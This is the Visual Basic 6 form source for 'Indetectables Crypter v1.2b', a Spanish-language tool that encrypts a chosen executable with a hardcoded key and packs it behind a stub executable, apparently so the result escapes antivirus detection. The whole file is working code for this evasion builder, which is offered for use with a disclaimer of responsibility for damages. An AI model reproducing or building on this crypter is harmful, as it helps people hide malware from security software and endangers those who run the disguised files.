VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "comdlg32.ocx"
Begin VB.Form Indetectabless 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Indetectables Crypter  v1.2b                 [by m3m0_11]"
   ClientHeight    =   2295
   ClientLeft      =   45
   ClientTop       =   360
   ClientWidth     =   6870
   Icon            =   "HackStylee.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2295
   ScaleWidth      =   6870
   StartUpPosition =   3  'Windows Default
   Begin VB.CheckBox Check1 
      Caption         =   "EOF"
      Height          =   255
      Left            =   2160
      TabIndex        =   4
      Top             =   1920
      Width           =   735
   End
   Begin VB.CommandButton Command3 
      Caption         =   "About"
      Height          =   255
      Left            =   1200
      TabIndex        =   3
      Top             =   1920
      Width           =   855
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Proteger"
      Height          =   255
      Left            =   120
      TabIndex        =   2
      Top             =   1920
      Width           =   975
   End
   Begin MSComDlg.CommonDialog m 
      Left            =   6120
      Top             =   0
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComDlg.CommonDialog f 
      Left            =   5640
      Top             =   0
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.CommandButton Command1 
      Caption         =   "..."
      Height          =   255
      Left            =   6120
      TabIndex        =   1
      Top             =   1440
      Width           =   375
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   120
      TabIndex        =   0
      Text            =   "File..."
      Top             =   1440
      Width           =   5895
   End
   Begin VB.Label Label2 
      Caption         =   "www.JodedorSoftware.tk"
      ForeColor       =   &H00FF0000&
      Height          =   255
      Left            =   4920
      TabIndex        =   6
      Top             =   1920
      Width           =   1815
   End
   Begin VB.Label Label1 
      Caption         =   "www.Indetectables.net"
      ForeColor       =   &H00FF0000&
      Height          =   255
      Left            =   3000
      TabIndex        =   5
      Top             =   1920
      Width           =   1695
   End
   Begin VB.Image Image1 
      Height          =   1275
      Left            =   -240
      Picture         =   "HackStylee.frx":628A
      Top             =   0
      Width           =   7140
   End
End
Attribute VB_Name = "Indetectabless"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
With f
.Filter = "Ejecutables (*.exe) | *.exe"
.DialogTitle = "Elija un archivo a proteger.."
.ShowOpen
End With
Text1.Text = f.Filename

End Sub

Private Sub Command2_Click()
If Text1.Text = "" Then
MsgBox "Elija un archivo!", vbInformation, "Indetectables Crypter  v1.2b"
Exit Sub
End If
Open App.Path & "\STUB.exe" For Binary As #1
Dim stub As String
stub = Space(LOF(1))
Get #1, , stub
Close #1
Open f.Filename For Binary As #1
Dim fs As String
fs = Space(LOF(1) - 1)
Get #1, , fs
Close #1

If Check1.Value = 1 Then
Dim sv As String
sv = ReadEOFData(f.Filename)
End If

With m
.Filter = "Ejecutables (*.exe) | *.exe"
.DialogTitle = "Guardar archivo.."
.ShowSave
End With

Dim H As New Class1
Open m.Filename For Binary As #1
Put #1, , stub & "!!!!!!!!!!!!!!!=))"
Put #1, , H.EncryptString(fs, "VIVALAMADREDELJOSE;;EEEE") & "!!!!!!!!!!!!!!!=))"
Put #1, , "VIVALAMADREDELJOSE;;EEEE" & "!!!!!!!!!!!!!!!=))"
Close #1


If Check1.Value = 1 Then
Call WriteEOFData(m.Filename, sv)
End If

MsgBox "Archivo protegido correctamente!", vbInformation, "Indetectables Crypter  v1.2b"

End Sub

Private Sub Command3_Click()
MsgBox "Este programa ha sido creado por m3m0_11" & vbNewLine & "No me hago responsable de los daños que puedan causar con esta utlidad" & vbNewLine & vbNewLine & "Compilado el 27/5/09 en VB6 Stub y Cliente", vbInformation, "Indetectables Crypter v1.2b"
End Sub

Private Sub Label1_Click()
Shell "cmd.exe /c start www.indetectables.net", vbHide
End Sub

Private Sub Label2_Click()
Shell "cmd.exe /c start www.jodedorsoftware.tk", vbHide
End Sub
